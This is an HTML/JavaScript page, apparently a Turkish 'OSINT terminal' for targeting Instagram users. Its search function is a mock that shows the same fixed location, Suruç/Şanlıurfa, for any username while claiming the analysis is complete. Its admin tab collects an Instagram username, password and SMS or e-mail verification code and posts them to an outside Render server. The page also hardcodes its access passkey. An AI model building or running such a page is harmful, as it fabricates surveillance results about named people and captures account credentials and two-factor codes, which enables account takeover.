<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ARCHERA | OSINT TERMINAL</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Outfit:wght@300;600;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    <style>
        :root { 
            --accent: #00d2ff; --secondary: #0072ff; --bg: #050a15; 
            --glass: rgba(255, 255, 255, 0.03); --border: rgba(0, 210, 255, 0.2); 
            --text: #e0f2fe; 
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Outfit', sans-serif; }
        body { background: var(--bg); color: var(--text); height: 100vh; overflow: hidden; }
        #canvas-bg { position: fixed; inset: 0; z-index: -1; background: radial-gradient(circle at center, #0a1931 0%, #050a15 100%); }

        /* LOADER */
        #loader { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 200000; flex-direction: column; align-items: center; justify-content: center; }
        .spinner { width: 50px; height: 50px; border: 4px solid var(--border); border-top-color: var(--accent); border-radius: 50%; animation: spin 1s infinite linear; }
        
        /* AUTH GATE */
        #auth-gate { position: fixed; inset: 0; z-index: 100000; display: flex; align-items: center; justify-content: center; background: #050a15; }
        .login-box { width: 90%; max-width: 400px; padding: 40px; border-radius: 30px; background: var(--glass); border: 2px solid var(--border); text-align: center; backdrop-filter: blur(10px); }
        
        /* PANEL STRUCTURE */
        #panel { display: none; height: 100vh; flex-direction: column; opacity: 0; transition: 1s; }
        .top-bar { padding: 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .main-view { flex: 1; padding: 20px; overflow-y: auto; padding-bottom: 100px; }
        .tab-content { display: none; }
        .tab-content.active { display: block; animation: fadeIn 0.5s; }

        /* UI ELEMENTS */
        .key-input { width: 100%; background: rgba(0,0,0,0.5); border: 1px solid var(--border); padding: 15px; border-radius: 15px; color: var(--accent); text-align: center; margin-bottom: 20px; outline: none; font-family: 'JetBrains Mono'; }
        .btn-enter { width: 100%; padding: 18px; border-radius: 15px; border: none; background: linear-gradient(45deg, var(--secondary), var(--accent)); color: #fff; font-weight: 800; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
        .result-card { background: var(--glass); border-radius: 20px; padding: 20px; border-left: 4px solid var(--accent); margin-bottom: 15px; }

        /* BOTTOM NAV */
        .bottom-nav { position: fixed; bottom: 0; width: 100%; height: 85px; background: rgba(5,10,21,0.98); border-top: 1px solid var(--border); display: flex; justify-content: space-around; align-items: center; padding-bottom: 15px; }
        .nav-item { color: #5b7a9d; text-align: center; cursor: pointer; flex: 1; font-size: 0.7rem; font-weight: 800; }
        .nav-item.active { color: var(--accent); }

        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <canvas id="canvas-bg"></canvas>

    <div id="loader">
        <div class="spinner"></div>
        <p style="margin-top:20px; letter-spacing:3px; font-size:12px; color:var(--accent);">TUNEL KURULUYOR...</p>
    </div>

    <div id="auth-gate">
        <div class="login-box">
            <h1 style="font-family:'Orbitron'; color:var(--accent); margin-bottom:10px;">SUROSINT</h1>
            <p style="font-size:9px; color:#5b7a9d; margin-bottom:30px; letter-spacing:2px;">VIRTUAL INTERFACE V4.2</p>
            <input type="password" id="gate-key" class="key-input" placeholder="PASSKEY">
            <button onclick="initSystem()" class="btn-enter">SISTEME SIZ</button>
        </div>
    </div>

    <div id="panel">
        <header class="top-bar">
            <div style="display:flex; align-items:center; gap:12px;">
                <img src="24841.jpg" style="width:38px; border-radius:10px; border:1px solid var(--accent);">
                <span style="font-weight:900; letter-spacing:1px;">ARCHERA</span>
            </div>
            <div style="font-family:'JetBrains Mono'; color:var(--accent); font-size:10px;">STORM-V4</div>
        </header>

        <main class="main-view">
            <section id="search" class="tab-content active">
                <div class="result-card">
                    <input type="text" id="target-id" placeholder="@kullanici_adi" class="key-input" style="text-align:left; margin-bottom:10px;">
                    <button onclick="mockSearch()" class="btn-enter" style="padding:12px;">HEDEFI TARA</button>
                </div>
                <div id="search-res"></div>
            </section>

            <section id="admin" class="tab-content">
                <h3 style="margin-bottom:20px; font-family:'Orbitron'; font-size:1rem;">HESAP TUNELI</h3>
                <div class="result-card" style="border-left-color: #e1306c;">
                    <p style="font-size:11px; margin-bottom:15px; color:#5b7a9d;">Instagram hesabini Render sunucusuna baglayarak operasyonu baslat.</p>
                    <button onclick="handleLoginFlow()" class="btn-enter" style="background:#e1306c;">HESAP EKLE</button>
                </div>
                <div id="tunnel-status"></div>
            </section>
        </main>

        <nav class="bottom-nav">
            <div class="nav-item active" onclick="switchTab('search', this)"><i class="fas fa-crosshairs" style="font-size:1.2rem;"></i><br>OSINT</div>
            <div class="nav-item" onclick="switchTab('admin', this)"><i class="fas fa-user-shield" style="font-size:1.2rem;"></i><br>ADMIN</div>
        </nav>
    </div>

    <script>
        const RENDER_URL = "https://surosint.onrender.com";

        function initSystem() {
            if(document.getElementById('gate-key').value === "baba") {
                document.getElementById('auth-gate').style.display = 'none';
                document.getElementById('panel').style.display = 'flex';
                setTimeout(() => document.getElementById('panel').style.opacity = '1', 50);
            } else { alert("YETKISIZ ERISIM KANKA."); }
        }

        function switchTab(id, el) {
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            el.classList.add('active');
        }

        async function handleLoginFlow() {
            const user = prompt("Instagram Kullanıcı Adı:");
            const pass = prompt("Şifre:");
            if(!user || !pass) return;

            showLoader(true);

            try {
                const response = await fetch(`${RENDER_URL}/api/v4/auth/link`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: user, password: pass })
                });
                const res = await response.json();
                showLoader(false);

                if(res.status === "challenge") {
                    const code = prompt("Instagram Kod Gönderdi! (SMS veya E-posta):");
                    if(code) {
                        showLoader(true);
                        const resCode = await fetch(`${RENDER_URL}/api/v4/auth/link`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ username: user, password: pass, verification_code: code })
                        });
                        const final = await resCode.json();
                        showLoader(false);
                        if(final.status === "success") {
                            alert("✅ TUNEL ACILDI!");
                            document.getElementById('tunnel-status').innerHTML = `<div class="result-card"><b>${user}</b>: BAGLI 🔥</div>`;
                        } else { alert("❌ HATA: " + final.message); }
                    }
                } else if(res.status === "success") {
                    alert("✅ GIRIS BASARILI!");
                    document.getElementById('tunnel-status').innerHTML = `<div class="result-card"><b>${user}</b>: BAGLI 🔥</div>`;
                } else {
                    alert("❌ HATA: " + res.message);
                }
            } catch (e) {
                showLoader(false);
                alert("❌ SUNUCU HATASI. Render loglarini kontrol et.");
            }
        }

        function showLoader(show) { document.getElementById('loader').style.display = show ? 'flex' : 'none'; }

        async function mockSearch() {
            const val = document.getElementById('target-id').value;
            if(!val) return;
            document.getElementById('search-res').innerHTML = `<div class="result-card">Hedef taranıyor: ${val}...</div>`;
            setTimeout(() => {
                document.getElementById('search-res').innerHTML = `<div class="result-card"><b>DURUM:</b> ANALIZ TAMAMLANDI<br><b>KONUM:</b> Suruç/Şanlıurfa</div>`;
            }, 1500);
        }

        const canvas = document.getElementById('canvas-bg');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        function draw() { ctx.fillStyle = "rgba(5,10,21,0.2)"; ctx.fillRect(0,0,canvas.width,canvas.height); requestAnimationFrame(draw); }
        draw();
    </script>
</body>
</html>
